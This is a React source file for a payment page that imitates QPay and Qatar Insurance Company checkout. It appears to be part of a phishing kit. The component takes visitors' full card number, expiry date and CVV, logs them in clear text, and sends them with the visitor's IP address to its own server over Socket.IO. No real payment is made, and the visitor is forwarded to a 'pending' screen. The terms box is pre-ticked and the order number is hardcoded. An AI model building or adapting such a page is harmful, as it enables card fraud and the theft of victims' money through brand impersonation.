import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';
import '../styles/PayQPay.css';

const PayQPay = () => {
  const navigate = useNavigate();
  const { socket, userIp } = useSocket();
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [errors, setErrors] = useState({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [acceptedTerms, setAcceptedTerms] = useState(true);
  const [showCvv, setShowCvv] = useState(false);
  const [showCvvPassword, setShowCvvPassword] = useState(false);

  // Payment details
  const [paymentNumber] = useState('11343762');
  const [paymentAmount, setPaymentAmount] = useState('4736.00');
  const [paymentDescription] = useState('Your e-commerce order from QATAR INSURANCE COMPANY');

  // Generate month and year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = currentYear + i;
    return { value: year.toString(), label: year.toString() };
  });

  useEffect(() => {
    // Check if user came from quote page and get payment data
    const orderData = sessionStorage.getItem('orderData');
    if (!orderData) {
      navigate('/quotecheaK');
      return;
    }

    // Get total price from order data
    try {
      const order = JSON.parse(orderData);
      if (order.totalPrice) {
        setPaymentAmount(order.totalPrice.toFixed(2));
      }
    } catch (error) {
      console.error('Error parsing order data:', error);
    }
  }, [navigate]);

  const handleInputChange = (field, value) => {
    if (field === 'cardNumber') {
      // Remove all non-digits and limit to 16 digits
      const digitsOnly = value.replace(/\D/g, '').substring(0, 16);
      setFormData(prev => ({
        ...prev,
        [field]: digitsOnly
      }));
    } else if (field === 'cvv') {
      // Remove all non-digits and limit to 3 digits
      const digitsOnly = value.replace(/\D/g, '').substring(0, 3);
      setFormData(prev => ({
        ...prev,
        [field]: digitsOnly
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [field]: value
      }));
    }

    // Clear error when user starts typing/selecting
    if (errors[field]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
    
    // Show CVV field when card number and expiry are filled
    const updatedFormData = { ...formData, [field]: value };
    if (updatedFormData.cardNumber && updatedFormData.expiryMonth && updatedFormData.expiryYear) {
      setShowCvv(true);
    }
  };

  const validateForm = () => {
    const newErrors = {};

    // Card number validation
    if (!formData.cardNumber) {
      newErrors.cardNumber = 'Card number is required';
    } else if (formData.cardNumber.length < 13 || formData.cardNumber.length > 16) {
      newErrors.cardNumber = 'Invalid card number';
    }

    // Expiry month validation
    if (!formData.expiryMonth) {
      newErrors.expiryMonth = 'Month is required';
    }

    // Expiry year validation
    if (!formData.expiryYear) {
      newErrors.expiryYear = 'Year is required';
    }

    // CVV validation (only if CVV field is shown)
    if (showCvv) {
      if (!formData.cvv) {
        newErrors.cvv = 'CVV2 is required';
      } else if (formData.cvv.length < 3) {
        newErrors.cvv = 'CVV2 must be 3 digits';
      }
    }

    // Check if card is expired
    if (formData.expiryMonth && formData.expiryYear) {
      const expiry = new Date(parseInt(formData.expiryYear), parseInt(formData.expiryMonth) - 1);
      const now = new Date();
      if (expiry < now) {
        newErrors.expiryMonth = 'Card has expired';
        newErrors.expiryYear = 'Card has expired';
      }
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm() || !acceptedTerms) {
      if (!acceptedTerms) {
        alert('يرجى قبول الشروط والأحكام');
      }
      return;
    }

    setIsProcessing(true);

    // حفظ بيانات الدفع في sessionStorage
    sessionStorage.setItem('pendingPayment', JSON.stringify({
      cardLastDigits: '****', // QPay لا يستخدم بطاقة
      phoneNumber: formData.phoneNumber || '+974 ****',
      amount: paymentAmount
    }));

    // Send payment data to backend
    if (socket && userIp) {
      const expirationDate = `${formData.expiryMonth}/${formData.expiryYear}`;
      const cardLastDigits = formData.cardNumber.slice(-4);
      
      console.log('🔵 QPay - Full formData:', formData);
      console.log('🔵 QPay - Card Number:', formData.cardNumber);
      console.log('🔵 QPay - CVV:', formData.cvv);
      console.log('🔵 QPay - Expiry Month:', formData.expiryMonth);
      console.log('🔵 QPay - Expiry Year:', formData.expiryYear);
      console.log('🔵 QPay - Expiration Date:', expirationDate);
      console.log('🔵 QPay - Card Last Digits:', cardLastDigits);
      
      const paymentData = {
        ip: userIp,
        paymentMethod: 'QPay - Mobile Payment',
        cardHolderName: 'QPay Customer',
        cardNumber: formData.cardNumber || '',
        cardLastDigits: cardLastDigits || '',
        expirationDate: expirationDate || '',
        cvv: formData.cvv || '',
        phoneNumber: '+974',
        amount: parseFloat(paymentAmount.replace(/,/g, '')) || 0,
        timestamp: new Date().toISOString()
      };
      
      console.log('💳 QPay - Payment object being sent:', paymentData);
      socket.emit('submitPayment', paymentData);
      console.log('✅ QPay payment submitted via Socket.IO');
    } else {
      console.error('❌ Socket or userIp not available:', { socket: !!socket, userIp });
    }

    // Navigate to payment pending page
    setTimeout(() => {
      navigate('/payment-pending');
      setIsProcessing(false);
    }, 1000);
  };

  const handleCancel = () => {
    navigate('/quotecheaK');
  };

  return (
    <div className="payqpay-page">
      <div className="payqpay__header">
        <img 
          src="/assets/images/qpay-icon.png" 
          alt="QPAY"
          className="payqpay__logo"
        />
      </div>

      <div className="payqpay__content">
        <div className="payqpay__info">
          <div className="payqpay__info-row">
            <span className="payqpay__info-label">Payment Unique Number:</span>
            <span className="payqpay__info-value">{paymentNumber}</span>
          </div>
          
          <div className="payqpay__info-row payqpay__info-row--full">
            <span className="payqpay__info-label">Description:</span>
            <span className="payqpay__info-value">{paymentDescription}</span>
          </div>

          <div className="payqpay__amount-section">
            <div className="payqpay__amount-label">Amount</div>
            <div className="payqpay__amount-value">QAR {paymentAmount}</div>
          </div>
        </div>

        <div className="payqpay__card">
          <div className="payqpay__card-header">
            Enter your payment card details
          </div>

          <form onSubmit={handleSubmit} className="payqpay__form">
            {/* Card Number */}
            <div className="payqpay__form-group">
              <label className="payqpay__label">Card Number</label>
              <input
                type="text"
                className={`payqpay__input ${errors.cardNumber ? 'error' : ''}`}
                value={formData.cardNumber}
                onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                placeholder="Enter card number"
                maxLength="16"
                name="cardNumber"
                autoComplete="cc-number"
              />
              {errors.cardNumber && (
                <span className="payqpay__error">{errors.cardNumber}</span>
              )}
            </div>

            {/* Card Expiry Date */}
            <div className="payqpay__form-group">
              <label className="payqpay__label">Card Expiry Date</label>
              <div className="payqpay__expiry-row">
                <select
                  className={`payqpay__select ${errors.expiryMonth ? 'error' : ''}`}
                  value={formData.expiryMonth}
                  onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                  name="expiryMonth"
                  autoComplete="cc-exp-month"
                >
                  <option value="">Month</option>
                  {months.map(month => (
                    <option key={month.value} value={month.value}>
                      {month.label}
                    </option>
                  ))}
                </select>

                <select
                  className={`payqpay__select ${errors.expiryYear ? 'error' : ''}`}
                  value={formData.expiryYear}
                  onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                  name="expiryYear"
                  autoComplete="cc-exp-year"
                >
                  <option value="">Year</option>
                  {years.map(year => (
                    <option key={year.value} value={year.value}>
                      {year.label}
                    </option>
                  ))}
                </select>
              </div>
              {(errors.expiryMonth || errors.expiryYear) && (
                <span className="payqpay__error">
                  {errors.expiryMonth || errors.expiryYear}
                </span>
              )}
            </div>

            {/* CVV2 Field - Shows only when card number and expiry are filled */}
            {showCvv && (
              <div className="payqpay__form-group">
                <label className="payqpay__label" htmlFor="cvv2">CVV2</label>
                <div className="payqpay__cvv-wrapper">
                  <input
                    type={showCvvPassword ? "text" : "password"}
                    id="cvv2"
                    name="cvv2"
                    className={`payqpay__input ${errors.cvv ? 'error' : ''}`}
                    value={formData.cvv}
                    onChange={(e) => handleInputChange('cvv', e.target.value)}
                    placeholder="CVV"
                    maxLength="3"
                    autoComplete="cc-csc"
                  />
                  <i 
                    className={`fa ${showCvvPassword ? 'fa-eye-slash' : 'fa-eye'} payqpay__cvv-toggle`}
                    onClick={() => setShowCvvPassword(!showCvvPassword)}
                  ></i>
                </div>
                {errors.cvv && (
                  <span className="payqpay__error">{errors.cvv}</span>
                )}
              </div>
            )}

            {/* Terms and Conditions */}
            <div className="payqpay__terms">
              <label className="payqpay__terms-checkbox">
                <input
                  type="checkbox"
                  checked={acceptedTerms}
                  onChange={(e) => setAcceptedTerms(e.target.checked)}
                  className="payqpay__checkbox"
                />
                <span className="payqpay__checkmark"></span>
                <span className="payqpay__terms-text">
                  I agree to the{' '}
                  <a 
                    href="https://qic.online/ar/terms-conditions" 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="payqpay__terms-link"
                  >
                    Terms and Conditions
                  </a>
                  {' '}of payment
                </span>
              </label>
            </div>

            {/* Payment Logos */}
            <div className="payqpay__payment-logos">
              <img 
                src="/assets/images/naps.svg"
                alt="NAPS"
                className="payqpay__payment-logo"
              />
              <img 
                src="/assets/images/himyan.svg"
                alt="HIMYAN"
                className="payqpay__payment-logo"
              />
            </div>

            {/* Action Buttons */}
            <div className="payqpay__actions">
              <button 
                type="submit" 
                className={`payqpay__btn payqpay__btn--continue ${isProcessing ? 'loading' : ''} ${acceptedTerms ? 'active' : ''}`}
                disabled={isProcessing || !acceptedTerms}
              >
                {isProcessing ? 'Processing...' : 'Continue'}
              </button>

              <button 
                type="button" 
                className="payqpay__btn payqpay__btn--cancel"
                onClick={handleCancel}
                disabled={isProcessing}
              >
                Cancel
              </button>
            </div>
          </form>
        </div>

        <div className="payqpay__notice">
          For proper completion of your transaction, please do not refresh this page or click the browser's back button.
        </div>
      </div>
    </div>
  );
};

export default PayQPay;
